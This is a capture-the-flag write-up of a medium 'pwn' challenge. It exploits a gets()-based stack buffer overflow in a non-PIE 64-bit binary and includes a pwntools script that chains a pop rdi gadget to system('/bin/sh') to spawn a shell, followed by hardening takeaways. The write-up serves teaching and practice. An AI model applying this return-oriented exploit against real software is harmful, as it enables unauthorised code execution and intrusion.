---
title: "Simple Buffer Overflow — Pwn Write-up"
date: "2024-01-20"
authors: ["Morgan Taylor", "Riley Kim"]
category: ctf
tags: ["Pwn", "Binary"]
difficulty: medium
excerpt: "Exploiting a stack buffer overflow to hijack execution and spawn a shell."
---

## Binary

- 64-bit ELF, no PIE, no RELRO
- `checksec` showed NX enabled and no canary (older challenge)

## Vulnerability

The program used `gets()` to read into a fixed-size buffer, allowing us to overwrite the saved return address.

## Exploit strategy

1. Find the offset to the return address with a cyclic pattern and `gdb`.
2. Locate a `pop rdi; ret` (or similar) gadget for the first argument.
3. Put `/bin/sh` in memory (or use a string from the binary).
4. Call `system()` and get a shell.

## Script (pwntools)

```python
from pwn import *

elf = context.binary = ELF("./vuln")
p = process()

offset = 72  # to saved rip
payload = flat(
    b"A" * offset,
    p64(0x40123b),  # pop rdi; ret
    p64(next(elf.search(b"/bin/sh"))),
    p64(elf.sym.system),
)
p.sendline(payload)
p.interactive()
```

## Flag

After spawning the shell we ran `cat flag.txt` to capture the flag.

## Takeaways

- Never use `gets()`; use bounded input.
- Enable stack canaries and ASLR in production.
